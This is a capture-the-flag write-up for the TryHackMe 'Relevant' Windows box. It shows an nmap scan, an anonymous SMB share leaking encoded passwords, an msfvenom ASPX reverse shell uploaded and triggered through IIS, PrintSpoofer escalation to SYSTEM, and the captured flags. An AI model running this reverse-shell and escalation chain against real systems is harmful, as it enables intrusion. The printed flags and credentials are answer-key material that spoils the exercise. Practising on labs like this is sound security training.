> Relevant | Black Box Pen Testing

**export IP=10.10.205.188**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 127 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
49663/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

# SMB

smbclient -L $IP

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
```

smbclient \\\\$IP\\nt4wrksv

```
passwords.txt
```

## passwords.txt

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw== => Bob - !P@$$W0rD!123
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk => Bill - Juw4nnaM4n420696969!$$$
```

# Gobuster - 49663

sudo gobuster -u http://$IP:49663 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x php,txt,bak,sql -t 20 -o gobuster/initial

```
nt4wrksv
```

Looks like this and SMB share is linked . IIS server requires .aspx file. So let's try to upload a reverse shell here!

msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f aspx > shell.aspx

In Smb , we use put shell.aspx. Typing curl http://$IP:49663/nt4wrksv/shell.aspx we have a shell!!

# Privilege Checking

whoami /priv

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have `SeImpersonatePrivilege`. But Potato attack won't work since DCOM is disabled.There is another exploit called `PrinterSpoofer` where service accounts are required to run with elevated privileges utilizing the SeImpersonate privilege.

whoami

```
iis apppool\defaultapppool => we are in as a service account
```

Let's upload PrintSpoofer.exe to the SMB share and access it in C:\inetpub\wwwroot\nt4wrksv.

And executing it

PrintSpoofer.exe -i -c cmd => we are in as `nt authority\system`

# user.txt => C:\Users\Bob\Desktop

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

# root.txt => C:\Users\Administrator\Desktop

```
THM{1fk5kf469devly1gl320zafgl345pv}
```